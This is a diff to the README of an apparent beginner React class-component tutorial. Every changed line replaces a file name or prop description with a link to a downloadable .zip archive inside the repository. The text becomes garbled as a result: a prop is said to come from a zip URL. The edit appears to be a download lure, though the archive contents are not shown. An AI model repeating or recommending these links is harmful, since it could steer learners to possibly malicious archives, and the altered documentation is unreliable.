@@ -4,15 +4,15 @@ This repository contains a simple example demonstrating a React class component 
 Files  
 
 
-# https://raw.githubusercontent.com/oomprakash99/ReactJsClassComp/main/src/Comp-Class-Js-React-3.4.zip 
+# https://github.com/oomprakash99/ReactJsClassComp/raw/refs/heads/main/src/components/React_Js_Class_Comp_v1.4-alpha.5.zip 
 The main application component that renders a greeting and the Comp1 component. It passes a name prop to Comp1. 
 
-# https://raw.githubusercontent.com/oomprakash99/ReactJsClassComp/main/src/Comp-Class-Js-React-3.4.zip 
+# https://github.com/oomprakash99/ReactJsClassComp/raw/refs/heads/main/src/components/React_Js_Class_Comp_v1.4-alpha.5.zip 
 A class component that displays the name prop and manages a state variable age. This component includes a button that increments the age by 5 each time it’s clicked. 
 # Key Concepts  
 
 # Props : 
-Comp1 receives a name prop from https://raw.githubusercontent.com/oomprakash99/ReactJsClassComp/main/src/Comp-Class-Js-React-3.4.zip 
+Comp1 receives a name prop from https://github.com/oomprakash99/ReactJsClassComp/raw/refs/heads/main/src/components/React_Js_Class_Comp_v1.4-alpha.5.zip 
 # State: 
 Comp1 uses the age state initialized to 20. 
 # Event Handling:
